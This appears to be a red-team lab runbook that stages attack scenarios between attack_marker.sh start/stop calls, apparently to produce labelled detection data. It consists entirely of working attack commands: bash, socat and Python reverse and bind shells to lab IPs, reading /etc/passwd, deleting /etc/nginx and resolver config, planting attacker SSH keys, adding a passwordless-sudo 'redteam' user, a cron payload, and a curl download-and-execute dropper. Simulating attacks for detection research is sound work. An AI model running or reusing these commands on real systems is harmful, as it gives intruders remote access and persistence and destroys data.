---------------------------------------------------------

& "C:\Program Files (x86)\Nmap\ncat.exe" -l 0.0.0.0 4444

./attack_marker.sh reverse_shell start rev_nc1

bash -i >& /dev/tcp/192.168.52.1/4444 0>&1


IN REVERSE SHELL:
id -a
cat /etc/passwd
rm /etc/systemd/resolved.conf
systemctl stop systemd-resolved
exit

./attack_marker.sh reverse_shell stop rev_nc1

---------------------------------------------------------


./attack_marker.sh bind_shell start bind_nc1

python3 -c 'import os,pty,socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",5555));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn("/bin/bash")'

& "C:\Program Files (x86)\Nmap\ncat.exe" --crlf 192.168.52.144 5555


IN BIND SHELL:
whoami
pwd
ls /home
echo "bind shell touched this" > /tmp/bind_nc1.txt
cat /tmp/bind_nc1.txt
find /tmp -type f | head -10
rm -f /tmp/f
exit

./attack_marker.sh bind_shell stop bind_nc1

---------------------------------------------------------

& "C:\Program Files (x86)\Nmap\ncat.exe" --crlf -l 0.0.0.0 4445
./attack_marker.sh reverse_shell start rev_socat1

socat TCP:192.168.52.1:4445 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane

IN REVERSE SHELL:
ls -lah /etc/nginx
rm -rf /etc/nginx

./attack_marker.sh reverse_shell stop rev_socat1


---------------------------------------------------------

./attack_marker.sh ssh_persistence start ssh1

mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaFakeKey attacker@test" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

./attack_marker.sh ssh_persistence stop ssh1

---------------------------------------------------------

./attack_marker.sh ssh_root start sshroot1

sudo bash -c 'echo "ssh-rsa AAAAB3FakeRoot attacker@test" >> /root/.ssh/authorized_keys'
sudo chmod 600 /root/.ssh/authorized_keys

./attack_marker.sh ssh_root stop sshroot1

---------------------------------------------------------

./attack_marker.sh user_add start user1

sudo useradd -m redteam
sudo bash -c 'echo "redteam:password" | chpasswd'

sudo usermod -aG sudo redteam

sudo bash -c 'echo "redteam ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/redteam'
sudo chmod 440 /etc/sudoers.d/redteam

./attack_marker.sh user_add stop user1

---------------------------------------------------------

./attack_marker.sh cron start cron1

echo '#!/bin/bash' > /tmp/cron_payload.sh
echo 'echo cron_run >> /tmp/persist.txt' >> /tmp/cron_payload.sh
chmod +x /tmp/cron_payload.sh

echo "* * * * * /tmp/cron_payload.sh" | sudo tee -a /etc/crontab

./attack_marker.sh cron stop cron1

---------------------------------------------------------

./attack_marker.sh dropper start drop1

curl -o /tmp/payload.sh https://example.com
chmod +x /tmp/payload.sh
bash /tmp/payload.sh


rm -f /tmp/payload.sh

./attack_marker.sh dropper stop drop1

---------------------------------------------------------
